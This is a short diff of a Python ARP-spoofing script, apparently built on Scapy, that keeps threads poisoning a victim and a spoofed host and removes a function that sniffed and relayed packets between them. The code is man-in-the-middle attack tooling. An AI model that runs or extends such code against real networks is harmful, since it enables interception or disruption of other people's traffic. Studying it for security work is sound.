@@ -37,19 +37,5 @@ if __name__ == "__main__":
     def poison_spoof():
         poison(attacker_iface, attacker_mac, spoof_ip, spoof_mac, victim_ip)
 
-    def forward_packets():
-        def forward(pkt):
-            if pkt[Ether].src == victim_mac:
-                pkt[Ether].dst = spoof_mac
-            else:
-                pkt[Ether].dst = victim_mac
-            sendp(pkt)
-        sniff(
-            prn=forward,
-            filter="ip and (ether src %s or ether src %s)" % (
-                victim_mac, spoof_mac)
-        )
-
     Thread(target=poison_victim).start()
     Thread(target=poison_spoof).start()
-    Thread(target=forward_packets).start()
